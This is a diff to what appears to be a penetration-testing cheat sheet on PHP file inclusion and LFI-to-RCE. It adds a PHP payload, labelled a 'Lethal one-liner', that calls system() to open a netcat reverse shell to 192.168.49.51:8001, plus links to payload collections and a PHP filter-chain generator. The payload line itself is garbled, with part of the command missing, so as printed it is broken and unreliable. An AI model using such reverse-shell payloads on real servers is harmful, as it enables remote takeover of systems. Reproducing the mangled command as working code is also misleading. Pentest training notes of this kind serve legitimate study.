@@ -19,6 +19,12 @@ Vhost config: /etc/apache2/sites-enabled/000-default.conf
 
 ## PHP
 
+{% code title="Lethal one-liner" %}
+```php
+"<?php system('rm /tmp/f;mkfifo /tm&1|nc 192.168.49.51 8001>/tmp/f'); ?>"
+```
+{% endcode %}
+
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md" %}
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md" %}
@@ -42,6 +48,12 @@ Wrappers to look out for:
 * zip (LFI2RCE)
 
 If there is an input field where it fetches a file and you control that parameter, you can view the source of php file itself or the apache log for LFI2RCE
+
+#### Filter Chains
+
+{% embed url="https://github.com/synacktiv/php_filter_chain_generator" %}
+
+{% embed url="https://exploit-notes.hdks.org/exploit/web/php-filters-chain/" %}
 
 {% hint style="info" %}
 Watch PHP deserialization
